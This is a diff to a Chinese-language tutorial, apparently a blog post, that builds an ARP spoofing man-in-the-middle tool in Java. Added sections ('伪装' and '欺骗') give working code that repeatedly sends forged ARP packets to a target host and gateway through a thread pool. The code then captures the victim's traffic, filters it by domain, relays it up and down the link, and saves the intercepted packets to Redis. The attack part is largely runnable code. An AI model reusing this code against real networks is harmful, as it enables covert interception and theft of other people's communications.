@@ -671,6 +671,8 @@ public Object get(KeyPrefix prefix, String key, Class<?> clazz){
 
 但是问题应该是出在`RedisConfig`的配置中，先不处理它。
 
+#### 5.5.1 伪装
+
 接下来开始编写攻击代码，攻击走的请求路径是`/attack/startAttack`，所以我们在`AttackController`中编写攻击的代码：
 
 ```java
@@ -743,6 +745,122 @@ private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHa
   //添加以太网首部
   arpPacket.datalink = ethernetPacket;
   return arpPacket;
+}
+```
+
+
+
+#### 5.5.2 欺骗
+
+伪装包已经创建好了，那就开始欺骗吧。原项目中直接`new`线程发包了，我改一下，我用线程池。
+
+```java
+//使用线程池
+private static final int CORE_POOL_SIZE = 5;//核心线程数
+private static final int MAXIMUM_POOL_SIZE = 10;//最大线程数
+private static final long KEEP_ALIVE_TIME = 1L;//空闲保活时间
+private static final TimeUnit UNIT = TimeUnit.MILLISECONDS;//时间单位
+private static final int QUEUE_CAPACITY = 5;//任务队列最大长度
+static ThreadPoolExecutor executor = new ThreadPoolExecutor(
+  CORE_POOL_SIZE,
+  MAXIMUM_POOL_SIZE,
+  KEEP_ALIVE_TIME,
+  UNIT,
+  new ArrayBlockingQueue<>(QUEUE_CAPACITY),//有界阻塞队列
+  new ThreadPoolExecutor.CallerRunsPolicy()//饱和策略选择调用线程帮忙的策略
+);
+```
+
+发包：
+
+```java
+//主线程调用方法，子线程发包
+sendPacket(arpToDst, arpToGate);
+
+
+private void sendPacket(Packet packet1, Packet packet2){
+  Runnable task = new Runnable() {
+    @Override
+    public void run() {
+      while(attacking){
+        try{
+          if(sender != null && attacking){
+            sender.sendPacket(packet1);
+          }
+          if(sender != null && attacking){
+            sender.sendPacket(packet2);
+          }
+          //控制发包的速度
+          Thread.sleep(500);
+        } catch (Throwable e) {
+          logger.error("Unknown error occur in send thread, ", e);
+        }
+      }
+    }
+  };
+  executor.execute(task);
+}
+```
+
+发完包之后，就可以准备接收并转发包，因为网关和目标主机会响应这些ARP请求。
+
+我们在配置攻击参数的时候，设置了`filterDomains`参数，即我们只抓取与这些域名相关的数据包。所以我们从网卡拿包的时候，需要进行过滤。过滤完之后，针对数据包的不同类型执行不同的转发操作：
+
+* 如果是上行链路，转发到网关
+* 如果是下行链路，转发到目标主机
+
+同时将数据包按批次号保存到redis，以便后续分析。
+
+```java
+private void receiveAndForwardingPacket(){
+  Runnable task = new Runnable() {
+    @Override
+    public void run() {
+      while(attacking){
+        try{
+          //接收数据包
+          Packet packet = captor.getPacket();
+          if(packet != null && packet != Packet.EOF){
+            //检查是否是IP包
+            if(packet instanceof IPPacket){
+              IPPacket ipPacket = (IPPacket) packet;
+              //数据包属于filterDomain
+              if(isRelatedToSpecificDomains(ipPacket.src_ip.getHostAddress())
+                 || isRelatedToSpecificDomains(ipPacket.dst_ip.getHostAddress())){
+                //将数据包转发到目标主机并保存到数据库
+
+                //如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
+                if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
+                  //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的攻击数据包，需要忽略
+                  if(packet.datalink instanceof EthernetPacket){
+                    EthernetPacket eth = (EthernetPacket) packet.datalink;
+                    String macFromCap = eth.getSourceAddress();
+                    if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
+                      savePacket(ipPacket, true);
+                    }
+                  }
+                  forward(ipPacket, gateMACBT);
+                }
+                //如果这个数据包的目的IP地址是目标主机的IP地址，那么说明是下行链路的数据包
+                else if(ipPacket.dst_ip.getHostAddress().equals(config.getDestIp())){
+                  savePacket(ipPacket, false);
+                  forward(ipPacket, dstMACBT);
+                }
+              }
+            }
+
+            //检查是否是ARP包
+            if(packet instanceof ARPPacket){
+              ....
+            }
+          }
+        }catch (Throwable e){
+          ...
+        }
+      }
+    }
+  };
+  executor.execute(task);
 }
 ```
 
